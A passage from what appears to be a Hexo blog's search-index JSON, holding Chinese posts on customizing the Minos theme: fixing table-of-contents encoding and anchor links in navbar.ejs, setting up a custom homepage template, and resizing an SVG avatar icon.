class=&quot;col-md-1&quot;&gt; &lt;div class=&quot;navbar-menu navbar-end&quot;&gt; &lt;% if (has_config(&apos;search&apos;)) { %&gt; &lt;a class=&quot;navbar-item search&quot; title=&quot;&lt;%= __(&apos;nav.search&apos;) %&gt;&quot; href=&quot;javascript:;&quot;&gt; &lt;i class=&quot;fas fa-search&quot;&gt;&lt;/i&gt; &lt;/a&gt; &lt;% } %&gt; &lt;% if (has_config(&apos;toc&apos;) &amp;&amp; get_config(&apos;toc&apos;) === true &amp;&amp; typeof(page.content) !== &apos;undefined&apos;) { %&gt; &lt;div class=&quot;navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc&quot;&gt; &lt;a class=&quot;navbar-item&quot; title=&quot;&lt;%= __(&apos;nav.toc&apos;) %&gt;&quot;&gt; &lt;i class=&quot;fa fa-list&quot;&gt;&lt;/i&gt; &lt;/a&gt; &lt;div class=&quot;navbar-dropdown is-right&quot;&gt; &lt;% let lastHeading = null; %&gt; &lt;% for (let heading of toc_list(page.content)) { %&gt; &lt;% if (lastHeading !== null &amp;&amp; heading[0].split(&apos;.&apos;)[0] !== lastHeading) { %&gt; &lt;hr class=&quot;navbar-divider&quot;&gt; &lt;% } %&gt; &lt;% lastHeading = heading[0].split(&apos;.&apos;)[0]; %&gt; &lt;a class=&quot;navbar-item&quot; href=&quot;#&lt;%- heading[2].replace(/&amp;amp;/g, &apos;&amp;&apos;).replace(/ /g,&apos;-&apos;) %&gt;&quot;&gt;&lt;%= heading[0] %&gt;&amp;nbsp;&amp;nbsp;&lt;%- heading[3] === 1 ? &apos;&lt;b&gt;&apos; : &apos;&apos; %&gt;&lt;%- heading[2].replace(/&amp;amp;/g, &apos;&amp;&apos;) %&gt;&lt;%- heading[3] === 1 ? &apos;&lt;/b&gt;&apos; : &apos;&apos; %&gt;&lt;/a&gt; &lt;% } %&gt; &lt;/div&gt; &lt;/div&gt; &lt;% } %&gt; &lt;% if (has_config(&apos;navbar_links&apos;)) { for (let name in get_config(&apos;navbar_links&apos;)) { let link = get_config(&apos;navbar_links&apos;)[name]; %&gt; &lt;a class=&quot;navbar-item&quot; title=&quot;&lt;%= name %&gt;&quot; href=&quot;&lt;%= typeof(link) === &apos;string&apos; ? link : link.url%&gt;&quot;&gt; &lt;% if (typeof(link) === &apos;string&apos;) { %&gt; &lt;%= name %&gt; &lt;% } else { %&gt; &lt;i class=&quot;&lt;%= link.icon %&gt;&quot;&gt;&lt;/i&gt; &lt;% } %&gt; &lt;/a&gt; &lt;% } %&gt; &lt;% } %&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/nav&gt; 配置自己的首页hexo中默认的主页为归档页，使用的插件为node_modules/hexo-generotor-index。 我的期望：设计一个介绍自己的主页，大图做背景 解决方法： 修改category 和 tag 调用的 index.ejs 页面为 index-booboo.ejs。 修改node_modules/hexo-generotor-index插件调用的index.ejs代码。 123cp minos/layout/index.ejs minos/layout/index-booboo.ejssed -i &apos;/index.ejs/index-booboo.ejs/g&apos; minos/layout/index.ejs minos/layout/category.ejssed -i &apos;/index.ejs/index-booboo.ejs/g&apos; minos/layout/index.ejs minos/layout/tag.ejs 修改node_modules/hexo-generotor-index插件调用的index.ejs代码如下： index.html 配置三人的头像阿里云www.iconfont.cn 修改svg的大小和类型 复制到的svg代码如下： 1&lt;svg t=&quot;1586079277539&quot; class=&quot;icon&quot; viewBox=&quot;0 0 1024 1024&quot; version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; p-id=&quot;3878&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;path d=&quot;M471.7 959.31h-40.3c-8.35 0-15.11-6.77-15.11-15.11 0-19.45 15.82-35.27 35.27-35.27h5.04v-55.42c0-8.35 6.77-15.11 15.11-15.11s15.11 6.77 15.11 15.11v90.68c-0.01 8.35-6.78 15.12-15.12 15.12zM592.61 959.31h-40.3c-8.35 0-15.11-6.77-15.11-15.11v-89.16c0-8.35 6.77-15.11 15.11-15.11s15.11 6.77 15.11 15.11v53.89h5.04c19.45 0 35.27 15.82 35.27 35.27-0.01 8.34-6.77 15.11-15.12 15.11z&quot; fill=&quot;#3F2704&quot; p-id=&quot;3879&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M777.7 547.27c0 146.74-118.96 212.91-265.7 212.91s-265.7-66.17-265.7-212.91 118.96-265.7 265.7-265.7 265.7 118.96 265.7 265.7z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3880&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M616.22 195.02c-17.51-5.03-29.28-20.42-29.28-38.29 0-41.67-32.99-76.17-73.54-76.91-20.37-0.34-39.44 7.25-53.9 21.45-14.47 14.21-22.44 33.2-22.44 53.47v1.99c0 17.87-11.76 33.26-29.28 38.29-160.3 46.09-272.25 194.85-272.25 361.76 0 98.48 38.75 178.65 112.08 231.85 65.66 47.64 157.09 72.82 264.39 72.82s198.72-25.18 264.39-72.82c73.32-53.19 112.08-133.37 112.08-231.85-0.01-166.91-111.96-315.67-272.25-361.76zM512 760.18c-146.74 0-265.7-66.17-265.7-212.91s118.96-265.7 265.7-265.7 265.7 118.96 265.7 265.7S658.74 760.18 512 760.18z&quot; fill=&quot;#B2D868&quot; opacity=&quot;.6&quot; p-id=&quot;3881&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M511.54 602.97c-13.01 0-26.55-5.35-37.05-15.84-5.9-5.9-5.9-15.47 0-21.37s15.47-5.9 21.37 0c7.65 7.65 18.88 9.36 24.52 3.72 5.63-5.63 3.93-16.84-3.7-24.49-5.89-5.9-5.89-15.45 0-21.35 7.63-7.65 9.33-18.87 3.7-24.49-5.64-5.64-16.86-3.93-24.52 3.72-5.9 5.9-15.47 5.9-21.37 0s-5.9-15.47 0-21.37c19.57-19.57 49.75-21.24 67.27-3.72 14.55 14.55 15.86 37.85 4.66 56.54 11.2 18.69 9.89 41.99-4.66 56.54-8.13 8.11-18.97 12.11-30.22 12.11z&quot; fill=&quot;#FF4E00&quot; p-id=&quot;3882&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M428.87 505.89H393.6c-8.35 0-15.11-6.77-15.11-15.11s6.77-15.11 15.11-15.11h35.27c8.35 0 15.11 6.77 15.11 15.11s-6.76 15.11-15.11 15.11zM428.87 546.19H393.6c-8.35 0-15.11-6.77-15.11-15.11s6.77-15.11 15.11-15.11h35.27c8.35 0 15.11 6.77 15.11 15.11s-6.76 15.11-15.11 15.11zM630.39 505.89h-35.27c-8.35 0-15.11-6.77-15.11-15.11s6.77-15.11 15.11-15.11h35.27c8.35 0 15.11 6.77 15.11 15.11s-6.76 15.11-15.11 15.11zM630.39 546.19h-35.27c-8.35 0-15.11-6.77-15.11-15.11s6.77-15.11 15.11-15.11h35.27c8.35 0 15.11 6.77 15.11 15.11s-6.76 15.11-15.11 15.11z&quot; fill=&quot;#3F2704&quot; p-id=&quot;3883&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M321.89 614c9.73 0 9.74-15.11 0-15.11-9.73 0-9.75 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3884&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M370.42 581.87c9.73 0 9.74-15.11 0-15.11-9.72 0-9.74 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3885&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M415.54 617.42c9.73 0 9.74-15.11 0-15.11-9.72 0-9.74 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3886&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M609.69 612.63c9.73 0 9.74-15.11 0-15.11-9.73 0-9.74 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3887&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M657.54 570.93c9.73 0 9.74-15.11 0-15.11-9.73 0-9.74 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3888&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M704.03 607.85c9.73 0 9.74-15.11 0-15.11-9.73-0.01-9.75 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3889&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M214.75 752.76c-6.84 0-13.04-4.67-14.69-11.62-1.93-8.12 3.08-16.27 11.2-18.2 44.48-10.59 77.46-37.1 92.86-74.65 15.08-36.78 10.9-78.42-11.49-114.24-4.42-7.08-2.27-16.4 4.81-20.83 7.08-4.42 16.4-2.27 20.83 4.81 13.6 21.75 21.99 46.27 24.27 70.91 2.24 24.21-1.37 48.7-10.44 70.82-9.2 22.44-23.45 41.83-42.36 57.64-19.89 16.63-43.93 28.39-71.46 34.94-1.2 0.28-2.38 0.42-3.53 0.42z&quot; fill=&quot;#3F2704&quot; p-id=&quot;3890&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M809.25 752.76c-1.16 0-2.34-0.13-3.51-0.41-27.53-6.56-51.58-18.31-71.46-34.94-18.91-15.81-33.16-35.2-42.36-57.64-9.07-22.12-12.69-46.61-10.44-70.82 2.28-24.64 10.67-49.16 24.27-70.91 4.42-7.08 13.75-9.23 20.83-4.81 7.08 4.42 9.23 13.75 4.81 20.83-22.39 35.82-26.58 77.46-11.49 114.24 15.4 37.54 48.38 64.05 92.86 74.65 8.12 1.93 13.14 10.08 11.2 18.2-1.67 6.93-7.87 11.61-14.71 11.61z&quot; fill=&quot;#3F2704&quot; p-id=&quot;3891&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M746.32 675.74c-2.85 0-5.74-0.81-8.3-2.5-6.97-4.59-8.9-13.97-4.3-20.94 19.16-29.08 28.87-64.42 28.87-105.03 0-52.31-15.95-102.42-46.13-144.92-4.83-6.81-3.23-16.24 3.57-21.07 6.8-4.83 16.24-3.24 21.07 3.57 33.83 47.64 51.71 103.8 51.71 162.42 0 46.63-11.39 87.56-33.86 121.66-2.9 4.42-7.72 6.81-12.63 6.81zM683.29 359.27c-3.44 0-6.9-1.17-9.74-3.57-25.33-21.38-54.1-37.29-85.52-47.28-7.96-2.53-12.35-11.03-9.82-18.98 2.53-7.95 11.03-12.35 18.98-9.82 35.23 11.2 67.48 29.03 95.85 52.99 6.38 5.38 7.18 14.92 1.8 21.3a15.113 15.113 0 0 1-11.55 5.36zM253.82 499.41c-1.18 0-2.38-0.14-3.58-0.43-8.11-1.97-13.09-10.15-11.12-18.26 14.61-60.08 49.44-114.51 98.08-153.24 24.32-19.37 51.44-34.45 80.61-44.83 30.18-10.74 61.87-16.19 94.19-16.19 8.35 0 15.11 6.77 15.11 15.11s-6.77 15.11-15.11 15.11c-57.31 0-111.24 18.83-155.96 54.44-43.42 34.57-74.51 83.13-87.54 136.73-1.68 6.92-7.87 11.56-14.68 11.56zM257.86 635.44c-6.26 0-12.11-3.92-14.28-10.16-8.23-23.71-12.4-49.95-12.4-78 0-8.35 6.77-15.11 15.11-15.11s15.11 6.77 15.11 15.11c0 24.66 3.61 47.57 10.73 68.09 2.74 7.89-1.44 16.5-9.33 19.23-1.62 0.57-3.29 0.84-4.94 0.84zM512 775.3c-72.91 0-136.67-15.89-184.39-45.95-7.06-4.45-9.18-13.78-4.73-20.84 4.45-7.06 13.78-9.18 20.84-4.73 42.88 27.02 101.07 41.29 168.27 41.29 49.91 0 94.33-7.7 132-22.9 7.74-3.12 16.55 0.62 19.67 8.36 3.12 7.74-0.62 16.55-8.36 19.67-41.28 16.66-89.49 25.1-143.3 25.1z&quot; fill=&quot;#996930&quot; p-id=&quot;3892&quot;&gt;&lt;/path&gt;&lt;/svg&gt; 修改class=&quot;icon&quot; 为 class=&quot;bi bi-award&quot; 修改width=&quot;200&quot; height=&quot;200&quot; 为 width=&quot;140&quot; height=&quot;140&quot; 修改后的代码： 1&lt;svg t=&quot;1586079277539&quot; class=&quot;bi bi-award&quot; viewBox=&quot;0 0 1024 1024&quot; version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; p-id=&quot;3878&quot; width=&quot;100&quot; height=&quot;100&quot;&gt;&lt;path d=&quot;M471.7 959.31h-40.3c-8.35 0-15.11-6.77-15.11-15.11 0-19.45 15.82-35.27 35.27-35.27h5.04v-55.42c0-8.35 6.77-15.11 15.11-15.11s15.11 6.77 15.11 15.11v90.68c-0.01 8.35-6.78 15.12-15.12 15.12zM592.61 959.31h-40.3c-8.35 0-15.11-6.77-15.11-15.11v-89.16c0-8.35 6.77-15.11 15.11-15.11s15.11 6.77 15.11 15.11v53.89h5.04c19.45 0 35.27 15.82 35.27 35.27-0.01 8.34-6.77 15.11-15.12 15.11z&quot; fill=&quot;#3F2704&quot; p-id=&quot;3879&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M777.7 547.27c0 146.74-118.96 212.91-265.7 212.91s-265.7-66.17-265.7-212.91 118.96-265.7 265.7-265.7 265.7 118.96 265.7 265.7z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3880&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M616.22 195.02c-17.51-5.03-29.28-20.42-29.28-38.29 0-41.67-32.99-76.17-73.54-76.91-20.37-0.34-39.44 7.25-53.9 21.45-14.47 14.21-22.44 33.2-22.44 53.47v1.99c0 17.87-11.76 33.26-29.28 38.29-160.3 46.09-272.25 194.85-272.25 361.76 0 98.48 38.75 178.65 112.08 231.85 65.66 47.64 157.09 72.82 264.39 72.82s198.72-25.18 264.39-72.82c73.32-53.19 112.08-133.37 112.08-231.85-0.01-166.91-111.96-315.67-272.25-361.76zM512 760.18c-146.74 0-265.7-66.17-265.7-212.91s118.96-265.7 265.7-265.7 265.7 118.96 265.7 265.7S658.74 760.18 512 760.18z&quot; fill=&quot;#B2D868&quot; opacity=&quot;.6&quot; p-id=&quot;3881&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M511.54 602.97c-13.01 0-26.55-5.35-37.05-15.84-5.9-5.9-5.9-15.47 0-21.37s15.47-5.9 21.37 0c7.65 7.65 18.88 9.36 24.52 3.72 5.63-5.63 3.93-16.84-3.7-24.49-5.89-5.9-5.89-15.45 0-21.35 7.63-7.65 9.33-18.87 3.7-24.49-5.64-5.64-16.86-3.93-24.52 3.72-5.9 5.9-15.47 5.9-21.37 0s-5.9-15.47 0-21.37c19.57-19.57 49.75-21.24 67.27-3.72 14.55 14.55 15.86 37.85 4.66 56.54 11.2 18.69 9.89 41.99-4.66 56.54-8.13 8.11-18.97 12.11-30.22 12.11z&quot; fill=&quot;#FF4E00&quot; p-id=&quot;3882&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M428.87 505.89H393.6c-8.35 0-15.11-6.77-15.11-15.11s6.77-15.11 15.11-15.11h35.27c8.35 0 15.11 6.77 15.11 15.11s-6.76 15.11-15.11 15.11zM428.87 546.19H393.6c-8.35 0-15.11-6.77-15.11-15.11s6.77-15.11 15.11-15.11h35.27c8.35 0 15.11 6.77 15.11 15.11s-6.76 15.11-15.11 15.11zM630.39 505.89h-35.27c-8.35 0-15.11-6.77-15.11-15.11s6.77-15.11 15.11-15.11h35.27c8.35 0 15.11 6.77 15.11 15.11s-6.76 15.11-15.11 15.11zM630.39 546.19h-35.27c-8.35 0-15.11-6.77-15.11-15.11s6.77-15.11 15.11-15.11h35.27c8.35 0 15.11 6.77 15.11 15.11s-6.76 15.11-15.11 15.11z&quot; fill=&quot;#3F2704&quot; p-id=&quot;3883&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M321.89 614c9.73 0 9.74-15.11 0-15.11-9.73 0-9.75 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3884&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M370.42 581.87c9.73 0 9.74-15.11 0-15.11-9.72 0-9.74 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3885&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M415.54 617.42c9.73 0 9.74-15.11 0-15.11-9.72 0-9.74 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3886&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M609.69 612.63c9.73 0 9.74-15.11 0-15.11-9.73 0-9.74 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3887&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M657.54 570.93c9.73 0 9.74-15.11 0-15.11-9.73 0-9.74 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3888&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M704.03 607.85c9.73 0 9.74-15.11 0-15.11-9.73-0.01-9.75 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3889&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M214.75 752.76c-6.84 0-13.04-4.67-14.69-11.62-1.93-8.12 3.08-16.27 11.2-18.2 44.48-10.59 77.46-37.1 92.86-74.65 15.08-36.78 10.9-78.42-11.49-114.24-4.42-7.08-2.27-16.4 4.81-20.83 7.08-4.42 16.4-2.27 20.83 4.81 13.6 21.75 21.99 46.27 24.27 70.91 2.24 24.21-1.37 48.7-10.44 70.82-9.2 22.44-23.45 41.83-42.36 57.64-19.89 16.63-43.93 28.39-71.46 34.94-1.2 0.28-2.38 0.42-3.53 0.42z&quot; fill=&quot;#3F2704&quot; p-id=&quot;3890&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M809.25 752.76c-1.16 0-2.34-0.13-3.51-0.41-27.53-6.56-51.58-18.31-71.46-34.94-18.91-15.81-33.16-35.2-42.36-57.64-9.07-22.12-12.69-46.61-10.44-70.82 2.28-24.64 10.67-49.16 24.27-70.91 4.42-7.08 13.75-9.23 20.83-4.81 7.08 4.42 9.23 13.75 4.81 20.83-22.39 35.82-26.58 77.46-11.49 114.24 15.4 37.54 48.38 64.05 92.86 74.65 8.12 1.93 13.14 10.08 11.2 18.2-1.67 6.93-7.87 11.61-14.71 11.61z&quot; fill=&quot;#3F2704&quot; p-id=&quot;3891&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M746.32 675.74c-2.85 0-5.74-0.81-8.3-2.5-6.97-4.59-8.9-13.97-4.3-20.94 19.16-29.08 28.87-64.42 28.87-105.03 0-52.31-15.95-102.42-46.13-144.92-4.83-6.81-3.23-16.24 3.57-21.07 6.8-4.83 16.24-3.24 21.07 3.57 33.83 47.64 51.71 103.8 51.71 162.42 0 46.63-11.39 87.56-33.86 121.66-2.9 4.42-7.72 6.81-12.63 6.81zM683.29 359.27c-3.44 0-6.9-1.17-9.74-3.57-25.33-21.38-54.1-37.29-85.52-47.28-7.96-2.53-12.35-11.03-9.82-18.98 2.53-7.95 11.03-12.35 18.98-9.82 35.23 11.2 67.48 29.03 95.85 52.99 6.38 5.38 7.18 14.92 1.8 21.3a15.113 15.113 0 0 1-11.55 5.36zM253.82 499.41c-1.18 0-2.38-0.14-3.58-0.43-8.11-1.97-13.09-10.15-11.12-18.26 14.61-60.08 49.44-114.51 98.08-153.24 24.32-19.37 51.44-34.45 80.61-44.83 30.18-10.74 61.87-16.19 94.19-16.19 8.35 0 15.11 6.77 15.11 15.11s-6.77 15.11-15.11 15.11c-57.31 0-111.24 18.83-155.96 54.44-43.42 34.57-74.51 83.13-87.54 136.73-1.68 6.92-7.87 11.56-14.68 11.56zM257.86 635.44c-6.26 0-12.11-3.92-14.28-10.16-8.23-23.71-12.4-49.95-12.4-78 0-8.35 6.77-15.11 15.11-15.11s15.11 6.77 15.11 15.11c0 24.66 3.61 47.57 10.73 68.09 2.74 7.89-1.44 16.5-9.33 19.23-1.62 0.57-3.29 0.84-4.94 0.84zM512 775.3c-72.91 0-136.67-15.89-184.39-45.95-7.06-4.45-9.18-13.78-4.73-20.84 4.45-7.06 13.78-9.18 20.84-4.73 42.88 27.02 101.07 41.29 168.27 41.29 49.91 0 94.33-7.7 132-22.9 7.74-3.12 16.55 0.62 19.67 8.36 3.12 7.74-0.62 16.55-8.36 19.67-41.28 16.66-89.49 25.1-143.3 25.1z&quot; fill=&quot;#996930&quot; p-id=&quot;3892&quot;&gt;&lt;/path&gt;&lt;/svg&gt; 原图：修改后：","link":"/2020/04/04/booboo_hexo/2020-04-04-tec-hexo/"},{"title":"Minos主题解决中文目录乱码问题","text":"摘要：在模版minos的基础上，定制一些自己的前端需求。 解决 目录 问题 目录中文乱码 无法链接跳转标题 带空格标题跳转问题 修改文件minos/layout/common/navbar.ejs，找到&lt;div class=&quot;navbar-dropdown is-right&quot;&gt;代码段 12345678910&lt;div class=&quot;navbar-dropdown is-right&quot;&gt; &lt;% let lastHeading = null; %&gt; &lt;% for (let heading of toc_list(page.content)) { %&gt; &lt;% if (lastHeading !== null &amp;&amp; heading[0].split(&apos;.&apos;)[0] !== lastHeading) { %&gt; &lt;hr class=&quot;navbar-divider&quot;&gt; &lt;% } %&gt; &lt;% lastHeading = heading[0].split(&apos;.&apos;)[0]; %&gt; &lt;a class=&quot;navbar-item&quot; href=&quot;#&lt;%= heading[1] %&gt;&quot;&gt;&lt;%= heading[0] %&gt;&amp;nbsp;&amp;nbsp;&lt;%- heading[3] === 1 ? &apos;&lt;b&gt;&apos; : &apos;&apos; %&gt;&lt;%= heading[2] %&gt;&lt;%- heading[3] === 1 ? &apos;&lt;/b&gt;&apos; : &apos;&apos; %&gt;&lt;/a&gt; &lt;% } %&gt;&lt;/div&gt; 问题-目录乱码原因：目录组件输出的&amp;符号为转义符&amp;amp;。HTML的&amp;lt;,&amp;gt;,&amp;amp;,&amp;quot;,&amp;copy;分别是&lt;，&gt;，&amp;，&quot;，©的转义字符。 解决方法：将&amp;amp;替换改为&amp; 1&lt;%- heading[2].replace(/&amp;amp;/g, &apos;&amp;&apos;) %&gt; 问题-无法链接跳转标题原因：代码中没有设置链接 解决方法： 1href=&quot;#&lt;%- heading[2].replace(/&amp;amp;/g, &apos;&amp;&apos;).replace(/ /g,&apos;-&apos;) %&gt;&quot; 问题-如果标题中含有空格则无法正常链接原因：markdown中待空格的标题会转变为符号-,因此无法正常跳转。 解决方法： 替换 %20 为 - 1&lt;%- heading[2].replace(/&amp;amp;/g, &apos;&amp;&apos;).replace(/ /g,&apos;-&apos;) %&gt; 最终代码 12345678910&lt;div class=&quot;navbar-dropdown is-right&quot;&gt; &lt;% let lastHeading = null; %&gt; &lt;% for (let heading of toc_list(page.content)) { %&gt; &lt;% if (lastHeading !== null &amp;&amp; heading[0].split(&apos;.&apos;)[0] !== lastHeading) { %&gt; &lt;hr class=&quot;navbar-divider&quot;&gt; &lt;% } %&gt; &lt;% lastHeading = heading[0].split(&apos;.&apos;)[0]; %&gt; &lt;a class=&quot;navbar-item&quot; href=&quot;#&lt;%- heading[2].replace(/&amp;amp;/g, &apos;&amp;&apos;).replace(/ /g,&apos;-&apos;) %&gt;&quot;&gt;&lt;%= heading[0] %&gt;&amp;nbsp;&amp;nbsp;&lt;%- heading[3] === 1 ? &apos;&lt;b&gt;&apos; : &apos;&apos; %&gt;&lt;%- heading[2].replace(/&amp;amp;/g, &apos;&amp;&apos;) %&gt;&lt;%- heading[3] === 1 ? &apos;&lt;/b&gt;&apos; : &apos;&apos; %&gt;&lt;/a&gt; &lt;% } %&gt;&lt;/div&gt;","link":"/2020/04/05/booboo_hexo/2020-04-05-tec-hexo/"},{"title":"Minos主题开发自己的首页","text":"摘要：在模版minos的基础上，定制一些自己的前端需求。 开发自己的首页hexo中默认的主页为归档页，使用的插件为node_modules/hexo-generotor-index。 我的期望：设计一个介绍自己的主页 解决方法： 修改category 和 tag 调用的 index.ejs 页面为 index-booboo.ejs。 修改node_modules/hexo-generotor-index插件调用的index.ejs代码。 123cp minos/layout/index.ejs minos/layout/index-booboo.ejssed -i &apos;/index.ejs/index-booboo.ejs/g&apos; minos/layout/index.ejs minos/layout/category.ejssed -i &apos;/index.ejs/index-booboo.ejs/g&apos; minos/layout/index.ejs minos/layout/tag.ejs 修改node_modules/hexo-generotor-index插件调用的index.ejs代码如下： index.html 配置三人的头像阿里云www.iconfont.cn 修改svg的大小和类型 复制到的svg代码如下： 1&lt;svg t=&quot;1586079277539&quot; class=&quot;icon&quot; viewBox=&quot;0 0 1024 1024&quot; version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; p-id=&quot;3878&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;path d=&quot;M471.7 959.31h-40.3c-8.35 0-15.11-6.77-15.11-15.11 0-19.45 15.82-35.27 35.27-35.27h5.04v-55.42c0-8.35 6.77-15.11 15.11-15.11s15.11 6.77 15.11 15.11v90.68c-0.01 8.35-6.78 15.12-15.12 15.12zM592.61 959.31h-40.3c-8.35 0-15.11-6.77-15.11-15.11v-89.16c0-8.35 6.77-15.11 15.11-15.11s15.11 6.77 15.11 15.11v53.89h5.04c19.45 0 35.27 15.82 35.27 35.27-0.01 8.34-6.77 15.11-15.12 15.11z&quot; fill=&quot;#3F2704&quot; p-id=&quot;3879&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M777.7 547.27c0 146.74-118.96 212.91-265.7 212.91s-265.7-66.17-265.7-212.91 118.96-265.7 265.7-265.7 265.7 118.96 265.7 265.7z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3880&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M616.22 195.02c-17.51-5.03-29.28-20.42-29.28-38.29 0-41.67-32.99-76.17-73.54-76.91-20.37-0.34-39.44 7.25-53.9 21.45-14.47 14.21-22.44 33.2-22.44 53.47v1.99c0 17.87-11.76 33.26-29.28 38.29-160.3 46.09-272.25 194.85-272.25 361.76 0 98.48 38.75 178.65 112.08 231.85 65.66 47.64 157.09 72.82 264.39 72.82s198.72-25.18 264.39-72.82c73.32-53.19 112.08-133.37 112.08-231.85-0.01-166.91-111.96-315.67-272.25-361.76zM512 760.18c-146.74 0-265.7-66.17-265.7-212.91s118.96-265.7 265.7-265.7 265.7 118.96 265.7 265.7S658.74 760.18 512 760.18z&quot; fill=&quot;#B2D868&quot; opacity=&quot;.6&quot; p-id=&quot;3881&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M511.54 602.97c-13.01 0-26.55-5.35-37.05-15.84-5.9-5.9-5.9-15.47 0-21.37s15.47-5.9 21.37 0c7.65 7.65 18.88 9.36 24.52 3.72 5.63-5.63 3.93-16.84-3.7-24.49-5.89-5.9-5.89-15.45 0-21.35 7.63-7.65 9.33-18.87 3.7-24.49-5.64-5.64-16.86-3.93-24.52 3.72-5.9 5.9-15.47 5.9-21.37 0s-5.9-15.47 0-21.37c19.57-19.57 49.75-21.24 67.27-3.72 14.55 14.55 15.86 37.85 4.66 56.54 11.2 18.69 9.89 41.99-4.66 56.54-8.13 8.11-18.97 12.11-30.22 12.11z&quot; fill=&quot;#FF4E00&quot; p-id=&quot;3882&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M428.87 505.89H393.6c-8.35 0-15.11-6.77-15.11-15.11s6.77-15.11 15.11-15.11h35.27c8.35 0 15.11 6.77 15.11 15.11s-6.76 15.11-15.11 15.11zM428.87 546.19H393.6c-8.35 0-15.11-6.77-15.11-15.11s6.77-15.11 15.11-15.11h35.27c8.35 0 15.11 6.77 15.11 15.11s-6.76 15.11-15.11 15.11zM630.39 505.89h-35.27c-8.35 0-15.11-6.77-15.11-15.11s6.77-15.11 15.11-15.11h35.27c8.35 0 15.11 6.77 15.11 15.11s-6.76 15.11-15.11 15.11zM630.39 546.19h-35.27c-8.35 0-15.11-6.77-15.11-15.11s6.77-15.11 15.11-15.11h35.27c8.35 0 15.11 6.77 15.11 15.11s-6.76 15.11-15.11 15.11z&quot; fill=&quot;#3F2704&quot; p-id=&quot;3883&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M321.89 614c9.73 0 9.74-15.11 0-15.11-9.73 0-9.75 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3884&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M370.42 581.87c9.73 0 9.74-15.11 0-15.11-9.72 0-9.74 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3885&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M415.54 617.42c9.73 0 9.74-15.11 0-15.11-9.72 0-9.74 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3886&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M609.69 612.63c9.73 0 9.74-15.11 0-15.11-9.73 0-9.74 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3887&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M657.54 570.93c9.73 0 9.74-15.11 0-15.11-9.73 0-9.74 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3888&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M704.03 607.85c9.73 0 9.74-15.11 0-15.11-9.73-0.01-9.75 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3889&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M214.75 